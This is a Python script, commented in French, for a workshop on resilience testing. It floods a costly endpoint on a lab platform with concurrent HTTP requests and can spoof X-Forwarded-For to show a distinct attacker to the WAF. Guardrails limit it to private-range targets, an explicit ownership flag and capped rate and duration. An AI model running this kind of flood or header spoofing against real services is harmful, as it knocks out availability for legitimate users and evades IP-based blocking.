#!/usr/bin/env python3
"""Scénario d'attaque n°1 : SATURATION APPLICATIVE CONTRÔLÉE (déni de service applicatif).

À lancer depuis le PC ATTAQUANT, contre la plateforme de l'équipe uniquement.

  python attack_flood.py --target http://192.168.137.1 --rps 300 --duration 90 --i-own-this-lab

Principe : inonder l'endpoint PUBLIC et coûteux /api/fees/quote (scoring de risque + lecture base).
Le service dégrade (latence, 503/504), puis la chaîne détection -> remédiation doit rétablir le service
SANS intervention. Cette attaque attaque la DISPONIBILITÉ ; elle ne compromet ni données ni comptes.

Garde-fous (volontairement stricts, à citer au jury) :
  * refuse toute cible hors plages privées RFC1918 (et refuse les noms de domaine publics)
  * exige --i-own-this-lab (acte explicite) et une durée plafonnée à 300 s, un débit plafonné à 1500 rps
  * s'arrête seul à la fin de la durée ou sur Ctrl+C ; n'envoie jamais de charge utile malveillante

Essai sur UN SEUL POSTE (sans 2e PC) : sous Docker Desktop, le WAF voit tout le trafic venant de
l'hôte sous la même adresse (la passerelle Docker) -- attaquant et utilisateurs légitimes sont alors
confondus, et un bannissement par IP bloque tout le monde. --spoof-ip simule une identité d'attaquant
distincte via l'en-tête X-Forwarded-For ; le WAF ne la croit QUE si TRUSTED_PROXIES (.env) est réglé
sur le sous-réseau du réseau `edge` (voir README, « Essai sur un seul poste »). Sans --spoof-ip,
comportement inchangé.
"""
import argparse
import asyncio
import ipaddress
import socket
import sys
import time
import urllib.parse

import httpx

MAX_DURATION, MAX_RPS = 300, 1500


def check_scope(target: str, allow_loopback: bool):
    host = urllib.parse.urlparse(target).hostname or ""
    try:
        ip = ipaddress.ip_address(socket.gethostbyname(host))
    except (socket.gaierror, ValueError):
        sys.exit(f"REFUS : cible '{host}' non résolue")
    private = ip.is_private and not ip.is_loopback and not ip.is_link_local
    if not (private or (allow_loopback and ip.is_loopback)):
        sys.exit(f"REFUS : {ip} n'est pas dans une plage privée de laboratoire. Hors périmètre du workshop.")
    return str(ip)


async def worker(client, url, deadline, interval, stats, headers):
    while time.time() < deadline:
        t0 = time.perf_counter()
        try:
            r = await client.get(url, params={"amount": "100"}, headers=headers)
            stats["codes"][r.status_code] = stats["codes"].get(r.status_code, 0) + 1
        except httpx.HTTPError as exc:
            k = type(exc).__name__
            stats["errors"][k] = stats["errors"].get(k, 0) + 1
        stats["sent"] += 1
        await asyncio.sleep(max(0.0, interval - (time.perf_counter() - t0)))


async def main_async(a):
    transport = httpx.AsyncHTTPTransport(local_address=a.source_ip, limits=httpx.Limits(max_connections=a.concurrency)) \
        if a.source_ip else httpx.AsyncHTTPTransport(limits=httpx.Limits(max_connections=a.concurrency))
    stats = {"sent": 0, "codes": {}, "errors": {}}
    deadline = time.time() + a.duration
    interval = a.concurrency / a.rps
    headers = {"User-Agent": "resilience-lab-flood/1.0"}
    if a.spoof_ip:
        headers["X-Forwarded-For"] = a.spoof_ip
    print(f"[{time.strftime('%H:%M:%S')}] ATTAQUE démarrée : {a.rps} req/s pendant {a.duration}s vers {a.target}"
          + (f" depuis {a.source_ip}" if a.source_ip else "")
          + (f" (identité simulée pour le WAF : {a.spoof_ip})" if a.spoof_ip else ""), flush=True)
    async with httpx.AsyncClient(base_url=a.target, timeout=3.0, transport=transport) as client:
        tasks = [asyncio.create_task(worker(client, "/api/fees/quote", deadline, interval, stats, headers))
                 for _ in range(a.concurrency)]

        async def reporter():
            while time.time() < deadline:
                await asyncio.sleep(5)
                print(f"[{time.strftime('%H:%M:%S')}] envoyées={stats['sent']} codes={stats['codes']} erreurs={stats['errors']}", flush=True)

        rep = asyncio.create_task(reporter())
        try:
            await asyncio.gather(*tasks)
        finally:
            rep.cancel()
    print(f"[{time.strftime('%H:%M:%S')}] fin. envoyées={stats['sent']} codes={stats['codes']} erreurs={stats['errors']}", flush=True)


def main():
    ap = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--target", required=True, help="ex. http://192.168.137.1")
    ap.add_argument("--rps", type=int, default=300)
    ap.add_argument("--duration", type=int, default=90)
    ap.add_argument("--concurrency", type=int, default=80)
    ap.add_argument("--source-ip", help="IP locale à utiliser (laboratoire multi-IP)")
    ap.add_argument("--spoof-ip", help="identité d'attaquant simulée (X-Forwarded-For) pour un essai sur un seul poste ; "
                                        "sans effet si TRUSTED_PROXIES n'est pas réglé côté WAF")
    ap.add_argument("--i-own-this-lab", action="store_true", help="confirme que la cible est la plateforme de l'équipe")
    ap.add_argument("--allow-loopback", action="store_true", help="tests locaux uniquement")
    a = ap.parse_args()
    if not a.i_own_this_lab:
        sys.exit("REFUS : ajoutez --i-own-this-lab pour confirmer que la cible est votre propre plateforme de laboratoire.")
    if a.duration > MAX_DURATION or a.rps > MAX_RPS or a.rps < 1:
        sys.exit(f"REFUS : durée <= {MAX_DURATION}s et débit <= {MAX_RPS} req/s.")
    if a.spoof_ip:
        try:
            ipaddress.ip_address(a.spoof_ip)
        except ValueError:
            sys.exit(f"REFUS : --spoof-ip '{a.spoof_ip}' n'est pas une adresse IP valide.")
    print(f"cible validée : {check_scope(a.target, a.allow_loopback)}")
    try:
        asyncio.run(main_async(a))
    except KeyboardInterrupt:
        print("interrompu par l'opérateur")


if __name__ == "__main__":
    main()
